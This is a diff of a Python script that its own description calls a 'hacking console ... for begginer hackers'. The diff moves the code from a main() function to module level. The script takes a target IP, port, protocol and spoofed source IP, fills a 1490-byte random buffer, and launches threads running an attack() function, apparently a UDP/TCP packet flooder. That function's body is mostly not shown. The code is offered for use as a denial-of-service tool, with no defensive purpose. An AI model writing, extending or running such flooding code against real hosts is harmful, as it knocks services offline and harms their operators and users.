@@ -33,12 +33,12 @@ except ImportError:
   #year = now.month
 
 
-def main():
-  print("Simp on Lemonade1S#5327 and CNJ#0516 or you’re Gay! >_<")
-  time.sleep(2)
-  os.system("clear")
+#def main():
+  #print("Simp on Lemonade1S#5327 and CNJ#0516 or you’re Gay! >_<")
+  #time.sleep(2)
+  #os.system("clear")
 
-  print("""
+print("""
                                                               
                                                           H
  __       _____   ______________   ________   __________o===o__     ______    _____
@@ -50,24 +50,24 @@ def main():
                                                           
       """)
 
-  parser = argparse.ArgumentParser(description = "Lemonade is a simple hacking console with cool features for begginer hackers! made by pastlecry#8645")
+parser = argparse.ArgumentParser(description = "Lemonade is a simple hacking console with cool features for begginer hackers! made by pastlecry#8645")
 
-  parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
-  parser.add_argument('--PORT', '--P', type = int, default = '80', help = 'Port', required = True)
-  parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
-  parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fale IP')
+parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
+parser.add_argument('--PORT', '--P', type = int, default = '80', help = 'Port', required = True)
+parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
+parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fale IP')
 
-  arguments = parser.parse_args()
+arguments = parser.parse_args()
 
-  ip = arguments.TARGET
-  port = arguments.PORT
-  protocol = arguments.PROTOCOL
-  fale_ip = arguments.FAKEIP
+ip = arguments.TARGET
+port = arguments.PORT
+protocol = arguments.PROTOCOL
+fale_ip = arguments.FAKEIP
 
-  bytes = random._urandom(1490)
-  pocket = 0
+bytes = random._urandom(1490)
+pocket = 0
 
-  os.system("clear")
+os.system("clear")
   #sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
   #os.system ("clear")
 
@@ -97,8 +97,8 @@ def attack():
 
   s.close()    
       
-if __name__ == "__main__":
-  main()
-  for i in range(2):
-    thread = threading.Thread(target = attack)
-    thread.start()
+#if __name__ == "__main__":
+  #main()
+for i in range(2):
+  thread = threading.Thread(target = attack)
+  thread.start()
